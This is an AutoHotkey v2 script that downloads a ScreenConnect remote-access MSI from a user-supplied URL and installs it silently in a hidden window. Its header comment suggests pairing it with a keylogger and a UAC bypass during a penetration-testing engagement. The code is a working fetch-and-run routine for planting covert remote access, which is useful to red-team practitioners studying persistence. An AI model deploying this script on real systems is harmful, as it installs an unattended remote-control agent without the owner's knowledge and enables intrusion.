; AHK v2 
; See Readme.md
; AHK Script to test installation of ScreenConnect MSI via AHK.
; Paste in install link where is says (Paste Install URL here).
; Save with .ahk file extension.
; Right click script and select Run as Administrator.
; Also could be used in combination with AutoPwnKey keylogger and UAC bypass for install as part of an engagement. 

installerName := "ScreenConnect_agent(My_Organization).msi"
downloadUrl   := "(Paste Install URL here)"
downloadPath  := A_ScriptDir "\" installerName

ConsoleOutput("Downloading ScreenConnect agent installer...")
if !DownloadFile(downloadUrl, downloadPath)
{
    MsgBox("Download failed. File not found at: " downloadPath, "Error", 16)
    ExitApp(1)
}

Sleep(3000)

ConsoleOutput("Installing ScreenConnect agent silently...")
exitCode := RunWait('msiexec /i "' downloadPath '" /qn /norestart', , "Hide")

if (exitCode = 0)
{
    MsgBox("ScreenConnect agent installed successfully.", "Success", 64)
}
else if (exitCode = 3010)
{
    MsgBox("Agent installed successfully. A reboot is required to complete installation.", "Installed (Reboot Required)", 48)
}
else
{
    MsgBox("Installation failed with exit code: " exitCode, "Install Failed", 16)
}

ExitApp(0)


ConsoleOutput(str) {
 
    OutputDebug str
 
}

DownloadFile(url, saveAs) {
    req := ComObject("MSXML2.XMLHTTP")
    req.Open("GET", url, false)  ; synchronous
    req.Send()

    ; Check HTTP status
    if (req.status != 200) {
        MsgBox("HTTP error " req.status ": " req.statusText, "Download Failed", 16)
        return false
    }

    ; Use an ADO Stream to write binary response to file
    stream := ComObject("ADODB.Stream")
    stream.Type := 1  ; adTypeBinary
    stream.Open()
    stream.Write(req.ResponseBody)
    stream.SaveToFile(saveAs, 2) ; adSaveCreateOverWrite = 2
    stream.Close()

    return FileExist(saveAs)
}
